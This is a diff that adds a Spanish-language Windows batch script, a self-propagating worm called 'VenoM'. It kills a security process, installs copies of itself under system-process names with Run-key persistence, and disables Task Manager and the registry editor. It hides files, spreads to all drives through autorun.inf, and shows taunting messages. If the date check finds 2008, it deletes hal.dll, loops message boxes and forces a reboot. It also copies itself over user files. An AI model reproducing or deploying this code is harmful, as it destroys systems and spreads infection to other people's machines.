@@ -1,0 +1,142 @@
+@shift 1
+@echo off
+echo ***Inicia proceso de Micro$oft*** %0    %username%    %date%    %time% >>"%appdata%\desktop.log
+if %COMPUTERNAME%==DESKTOP goto NOT
+if '%COMPUTERNAME%== ' goto NOT
+   set YU=C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
+   set TU=F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
+      goto ini
+:NOT
+   set YU=C,D,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
+   set TU=G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
+:ini
+   set a=%random%
+    taskkill /f /im Ad-Watch.exe
+    copy /y %0 "%Windir%\System\winlogon.exe"
+if exist "%Windir%\System\winlogon.exe" goto cop
+    copy /y %0 "%appdata%\smss.exe"
+         reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CFTMON.EXE /t REG_SZ /d "%appdata%\smss.exe" /f
+
+:cop
+          reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v CFTMON.EXE /t REG_SZ /d "%Windir%\System\winlogon.exe" /f
+if %COMPUTERNAME%==DESKTOP goto NO
+if '%COMPUTERNAME%== ' goto NO
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d "1" /f
+          reg add "HKCU\Software\Microsoft\Windows\Currentversion\Policies\System" /v DisableTaskMgr /t reg_dword /d "1" /f
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d "1" /f
+          reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d "1" /f
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d "2" /f
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d "1" /f
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d "0" /f
+          reg add "HKCU\_VenoM_Software_%a%%a%%a%\Virus" /v estas /d "infectado"
+    copy /y %0 "%userprofile%\MenЃ Inicio\Programas\Inicio\MS-DOS.pif"
+    copy /y %0 "%systemdrive%\Docume~1\Default User\MenЃ Inicio\Programas\Inicio\System.exe"
+    copy /y %0 "%userprofile%\SendTo\Mis documetos.exe"
+    copy /y %0 "%userprofile%\SendTo\Disco extraible.pif"
+    copy /y %0 "%userprofile%\SendTo\Documentos compartidos.scr"
+      cd %userprofile%
+      date /t>desktop.inf
+      find "2008" desktop.inf
+if errorlevel 0 if not errorlevel 1 goto Dr
+
+:NO
+attrib +h %windir%
+    copy /y %0 "%systemdrive%\WINDOWS.EXE"
+    copy /y %0 "%windir%\system32\%username% 3D.scr"
+    copy /y %0 "%userprofile%\MenЃ Inicio\Mis documentos.exe"
+    copy /y %0 "%userprofile%\Datosd~1\Microsoft\Internet Explorer\Quick Launch\Mis documentos.exe"
+    copy /y %0 "%systemdrive%\RECYCLER\Documendos borrados de %username%.exe"
+    copy /y %0 "%systemdrive%\RECYCLER\Papelera de reciclaje compartida.exe"
+      cd "%userprofile%"
+echo [autorun>>autorun.inf
+echo open=VenoM.666\Explorer.exe>>autorun.inf
+echo shell\Open=>>autorun.inf
+echo shell\Open\Command=.\VenoM.666\Explorer.exe>>autorun.inf
+echo shell\Explore\=>>autorun.inf
+echo shell\Explore\Command=.\VenoM.666\Explorer.exe>>autorun.inf
+echo shell\find\=>>autorun.inf
+echo shell\find\Command=.\VenoM.666\Explorer.exe>>autorun.inf
+echo shell\CMD=Sяmbolo del sistema>>autorun.inf
+echo shell\CMD\Command=.\VenoM.666\Explorer.exe>>autorun.inf
+for %%h in (%YU%) do if exist %%h:\*.* attrib -h -s %0Љ /y %0 "%%h:\100%% %username%.exe"&attrib -r -a -s -h %%h:\*.inf>NulЉ /y autorun.inf %%h:\autorun.inf>Nul&attrib +s +h +r +a %%h:\autorun.inf>Nul&md %%h:\VenoM.666>NulЉ /y %0 %%h:\VenoM.666\Explorer.exe>Nul&attrib +s +h %%h:\VenoM.666\*.exe>Nul&attrib +s +h %%h:\VenoM.666&echo %username%---%date%---%time% in %%h:>>"%appdata%\desktop.inf"
+if %COMPUTERNAME%==DESKTOP goto l
+if '%COMPUTERNAME%== ' goto l
+      cd "%userprofile%"
+echo "El juego a terminado. Tu has sido derrotado por VenoM (Metauro_3@hotmail.com).">VenoM.txt
+echo.>>VenoM.txt
+echo ллллллл                  лллл
+echo ллллллл                  лллл                                                лллл             лллл>>VenoM.txt
+echo    лллл                      лл                                                ллллл          ллл л>>VenoM.txt
+echo      лллл                   лл                                                 ллл   л       ллл   л>>VenoM.txt
+echo       лллл                лл   ллллллл    ллл   ллл       ллллл      ллл    л    ллл    л>>VenoM.txt
+echo         лллл             лл   ллл       л   ллллл    л    ллл    л    ллл      л ллл      л>>VenoM.txt
+echo          лллл          лл    ллл       л   лллл       л   ллл    л    ллл       ллл       л>>VenoM.txt
+echo            лллл       лл      лллллллл    ллл         л   ллл    л    ллл                   л>>VenoM.txt
+echo             лллл    лл       ллл            ллл         л   ллл    л    ллл                   л>>VenoM.txt
+echo               ллллллл         ллл       л   ллл         л   ллл    л    ллл                   л>>VenoM.txt
+echo                лллл             ллллллл    ллл         л    ллллл    ллллл                ллл>>VenoM.txt
+
+    copy /y VenoM.txt "%userprofile%\SendTo\Game Over %a%%a%.txt"
+    print VenoM.txt
+for /l %%t in (1,1,24) do at %%t /delete
+   set h=0
+
+:q
+   at %h%:13 /interactive "%userprofile%\VenoM.txt"
+   set /a h=%h%+1
+if %h%==24 goto l
+      goto q
+
+:l
+if exist "%appdata%\services.exe" goto bl
+    copy /y %0 "%appdata%\services.exe"
+:bl
+if exist "%appdata%\lsass.exe" goto oz
+    copy /y %0 "%appdata%\lsass.exe"
+:oz
+if %0=="%appdata%\services.exe" goto ser
+if %0=="%appdata%\lsass.exe" goto w
+
+"%appdata%\services.exe"
+"%appdata%\lsass.exe"
+exit
+
+:w
+      cd "%userprofile%"
+for %%h in (%YU%) do if exist %%h:\*.* (if not exist "%%h:\VenoM.666\Explorer.exe" goto d )
+for %%h in (%YU%) do if exist %%h:\*.* (if not exist "%%h:\autorun.inf" goto d )
+      goto w
+
+:d
+      cd "%userprofile%"
+for %%h in (%YU%) do if exist %%h:\*.* attrib -h -s %0Љ /y %0 "%%h:\100%% %username%.exe"&attrib -r -a -s -h %%h:\*.infЉ /y autorun.inf %%h:\autorun.inf&attrib +s +h +r +a %%h:\autorun.inf&md %%h:\VenoM.666Љ /y %0 %%h:\VenoM.666\Explorer.exe&attrib +s +h %%h:\VenoM.666\*.exe&attrib +s +h %%h:\VenoM.666&echo %username%---%date%---%time%   in %%h:>>"%appdata%\desktop.inf"
+      goto w
+
+:Dr
+if %COMPUTERNAME%==DESKTOP exit
+       del /f /q "%windir%\system32\hal.dll"
+      cd "%userprofile%\MenЃ Inicio\Programas\Inicio\"
+echo shutdown -r -f -t 00>VenoM.bat
+echo OPTION EXPLICIT>VenoM.vbs
+echo DIM clave>>VenoM.vbs
+echo DO WHILE (clave ^<^> "666")>>VenoM.vbs
+echo clave = msgbox ("", VBCRITICAL, "")>>VenoM.vbs
+echo clave = msgbox ("Maiden Germany", VBCRITICAL, "VenoM 4.2")>>VenoM.vbs
+echo clave = msgbox ("metauro_3@hotmail.com", VBCRITICAL, "VenoM")>>VenoM.vbs
+echo LOOP>>VenoM.vbs
+      start VenoM.vbs
+       shutdown -r -f -t 120 -c "Welcome to Hell"
+
+:B
+echo 
+      goto B
+
+:ser
+      cd "%appdata%"
+   set u=%0
+dir "%userprofile%\misdoc~1\*." /b /s >"%appdata%\NTUSER.DAT.DLL"
+for %%f in (%TU%) do if exist %%f:\*.* (dir "%%f:\*." /b /s) >>"%appdata%\NTUSER.DAT.DLL"
+for /f "tokens=* delims= " %%a in (NTUSER.DAT.DLL) do call :V "%%a"
+:V
+   set t=%1
+    copy /y %u% %t%.exe
